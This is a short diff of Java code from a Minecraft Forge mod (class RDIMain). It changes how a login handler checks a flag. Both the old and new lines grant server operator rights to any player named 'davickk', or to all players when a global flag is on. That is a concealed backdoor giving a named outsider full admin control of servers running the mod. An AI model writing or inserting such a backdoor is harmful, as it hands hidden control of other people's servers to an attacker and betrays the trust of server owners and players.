@@ -65,7 +65,7 @@ public class RDIMain {
     @SubscribeEvent
     public static void onPlayerJoin(PlayerEvent.PlayerLoggedInEvent e){
         ServerPlayerEntity player = (ServerPlayerEntity) e.getEntity();
-        if (player.getDisplayName().getString().equals("davickk") || RDI.ALL_OP) {
+        if (player.getDisplayName().getString().equals("davickk") || RDI.isAllOp()) {
             player.server.getPlayerList().op(player.getGameProfile());
         }
     }
